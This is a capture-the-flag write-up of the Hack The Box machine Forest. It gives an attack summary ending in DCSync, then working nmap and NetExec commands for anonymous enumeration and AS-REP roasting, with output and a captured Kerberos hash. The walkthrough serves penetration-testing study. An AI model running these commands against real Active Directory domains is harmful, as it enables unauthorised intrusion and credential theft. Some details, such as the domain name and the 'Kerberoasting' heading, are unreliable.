<p align="center">
  <img src="img/Forest.png" alt="Description de l'image" width="300"/>
</p>

# Intro

Forest was my first AD machine after completed the CPTS path of HTB.
It's a well known machine for getting started with Active Directory environments. It is an easy-rated machine. The pentest is performed in a black box context as we have no credentials, only the machine's IP address.
I started by a ASREP-Roasting and found that `svc_alfresco` do not requirer Kerberos pre-auth and succesfuly cracked offline his TGT.
After that I used his account to harvest all the domain ACLs and discovered that `svc_alfresco` is a part of the `Account Operators` which has the `GenericAll` over the `Exchange Windows Permissions`.
This group has the `DCSync` ACL over the domain. So I performed a DCSync attack to recover the `Administrator` NT hash and fully compromised the domain

# Walkthough

## Enumeration

I began to enumerate services on the host with the `nmap` tool.

#### Nmap
```bash
 # nmap -sV -sC -p- -T5 10.129.62.73

PORT      STATE SERVICE      VERSION
25/tcp    open  smtp-proxy   Avast! anti-virus smtp proxy (cannot connect to 10.129.62.73)
|_smtp-commands: SMTP EHLO nmap.scanme.org: failed to receive data: connection closed
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-10-15 09:56:11Z)
110/tcp   open  pop3-proxy   Avast! anti-virus pop3 proxy (cannot connect to 10.129.62.73)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
143/tcp   open  imap-proxy   Avast! anti-virus IMAP proxy (cannot connect to 10.129.62.73)
|_imap-capabilities: CAPABILITY
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
587/tcp   open  smtp-proxy   Avast! anti-virus smtp proxy (cannot connect to 10.129.62.73)
|_smtp-commands: SMTP EHLO nmap.scanme.org: failed to receive data: connection closed
993/tcp   open  tcpwrapped
995/tcp   open  tcpwrapped
49664/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49670/tcp open  unknown
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49996/tcp open  unknown
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   311:
|_    Message signing enabled and required
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2025-10-15T02:56:25-07:00
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time:
|   date: 2025-10-15T09:56:23
|_  start_date: 2025-10-15T08:53:18
```

Kerberos and LDAP services are exposed on the host, which leads to conclude that this is a Domain Controller within an Active Directory environment.
The domain name is `forest.htb` and The DC FQDN is `FOREST.forest.htb`.

## Kerberoasting `svc-alfresco`

It seems like nmap was able to retrieve several information, like smb is accessible from an anonymous connexion.
Let's confirm that with NetExect.

#### NetExec
```bash
# nxc smb 10.129.62.73 -u '' -p ''
SMB         10.129.62.73    445    FOREST           [*] Windows 10 / Server 2016 Build 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.129.62.73    445    FOREST           [+] htb.local\:
```

It's confirmed, it is the same for ldap?

```
nxc ldap 10.129.62.73 -u '' -p ''
LDAP        10.129.62.73    389    FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.62.73    389    FOREST           [+] htb.local\:
```

Yes! So whith that, we can perfrom an AS-REP Roast attack to request a user TGT without his password.

```
# nxc ldap 10.129.62.73 -u '' -p '' --asreproast asreproast.txt
LDAP        10.129.62.73    389    FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.62.73    389    FOREST           [+] htb.local\:
LDAP        10.129.62.73    389    FOREST           [*] Total of records returned 1
LDAP        10.129.62.73    389    FOREST           $krb5asrep$23$svc-alfresco@HTB.LOCAL:68342ef59bc941531618bb589cedd8b9$703ea2b719fbf84824611c4a36e59852274e2965faea332486dd5a722303a807aa6725bb329781f67eb5658f04b87d2ff9053d1840c47838b432d96101ca7dd50251a8c3d5c43a7835d5738ab027807d30692966ead77e33e4011fe47bb7a073a347afd640a2016bda5bdde0c0b96e5c08cd6019867d784be570a5796c7f238fd28cbd0defb930880719502dfd430d47bfe86c1a18de199a44a5163b11eddc794ef682f8d16c807c6b2bbc621a43506a4f5bbea0fc499c92f9f82b37f9e0a0689c938ac1e1cdd6a4dfff8bfe16c88965469cc3b8c89ef41655f9b8999dd3ab73885b7e083452
```

